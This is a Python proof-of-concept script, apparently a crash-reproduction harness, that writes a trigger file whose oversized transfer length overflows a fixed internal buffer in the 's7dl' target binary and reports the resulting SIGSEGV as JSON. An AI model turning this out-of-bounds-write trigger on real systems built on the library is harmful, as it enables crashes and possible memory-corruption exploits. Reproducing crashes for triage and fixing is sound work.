#!/usr/bin/env python3
"""PoC trigger generator for the s7dl target binary.

Dynamically builds a trigger file (start offset, transfer size, data buffer)
that drives the target's data-transfer operation into an out-of-bounds write
resulting in a SIGSEGV, then reports the run outcome as a JSON contract.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time

# The target copies `size` bytes from the caller buffer into an internal
# fixed-size buffer (~2 KiB). Sizes the library still accepts as valid
# (<= 65535) but that exceed that internal buffer overflow it and segfault.
# 4096 is comfortably past the crash threshold (>= ~3 KiB) while remaining
# within the library's accepted parameter range.
START_OFFSET = 0
TRANSFER_SIZE = 4096
BUFFER_DATA = b"A" * 64


def build_trigger_payload():
    """Construct the trigger bytes entirely in code: 8-byte header + buffer."""
    header = struct.pack("<ii", START_OFFSET, TRANSFER_SIZE)
    return header + BUFFER_DATA


def signal_name(returncode):
    if returncode is not None and returncode < 0:
        try:
            return signal.Signals(-returncode).name
        except ValueError:
            return "SIG%d" % (-returncode)
    return None


def run_target(binary, trigger_path, timeout):
    argv = [binary, trigger_path]
    started = time.monotonic()
    result = {
        "argv": argv,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "error": None,
    }
    try:
        proc = subprocess.run(
            argv,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            check=False,
        )
        result["returncode"] = proc.returncode
        result["signal"] = signal_name(proc.returncode)
        result["stdout"] = proc.stdout.decode("utf-8", errors="replace")
        result["stderr"] = proc.stderr.decode("utf-8", errors="replace")
    except subprocess.TimeoutExpired as exc:
        result["timed_out"] = True
        result["stdout"] = (exc.stdout or b"").decode("utf-8", errors="replace")
        result["stderr"] = (exc.stderr or b"").decode("utf-8", errors="replace")
    except OSError as exc:
        result["error"] = "failed to execute binary: %s" % exc
    result["runtime_ms"] = int((time.monotonic() - started) * 1000)
    return result


def make_observable(run):
    if run["error"] is not None:
        return {"kind": "custom", "value": run["error"], "path": None}
    if run["timed_out"]:
        evidence = "process exceeded timeout; partial output: %s%s" % (
            run["stdout"],
            run["stderr"],
        )
        return {"kind": "combined_output", "value": evidence.strip(), "path": None}
    if run["signal"] is not None:
        last_line = ""
        for line in run["stdout"].splitlines():
            if line.strip():
                last_line = line.strip()
        evidence = "process terminated by %s (returncode %d)" % (
            run["signal"],
            run["returncode"],
        )
        if last_line:
            evidence += " after emitting %r" % last_line
        return {"kind": "crash_trace", "value": evidence, "path": None}
    evidence = (run["stdout"] + run["stderr"]).strip()
    return {"kind": "combined_output", "value": evidence, "path": None}


def main():
    parser = argparse.ArgumentParser(
        description="Generate a crashing trigger for the s7dl target binary."
    )
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="optional JSON output file")
    parser.add_argument("--timeout", type=float, default=30.0,
                        help="run timeout in seconds (default: 30)")
    args = parser.parse_args()

    payload = build_trigger_payload()

    run = None
    trigger_path = None
    try:
        with tempfile.NamedTemporaryFile(
            prefix="s7dl-trigger-", suffix=".bin", delete=False
        ) as tmp:
            tmp.write(payload)
            trigger_path = tmp.name
        run = run_target(args.binary, trigger_path, args.timeout)
    finally:
        if trigger_path is not None:
            try:
                os.unlink(trigger_path)
            except OSError:
                pass

    if run is None:
        run = {
            "argv": [args.binary, trigger_path or ""],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "error": "failed to create trigger file",
        }

    report = {
        "binary": args.binary,
        "command": run["argv"],
        "returncode": run["returncode"],
        "signal": run["signal"],
        "timed_out": run["timed_out"],
        "runtime_ms": run["runtime_ms"],
        "stdout": run["stdout"],
        "stderr": run["stderr"],
        "observable": make_observable(run),
        "error": run["error"],
    }

    text = json.dumps(report, indent=2)
    print(text)

    if args.json_out:
        try:
            with open(args.json_out, "w") as fh:
                fh.write(text + "\n")
        except OSError as exc:
            print("warning: could not write %s: %s" % (args.json_out, exc),
                  file=sys.stderr)

    return 0


if __name__ == "__main__":
    sys.exit(main())
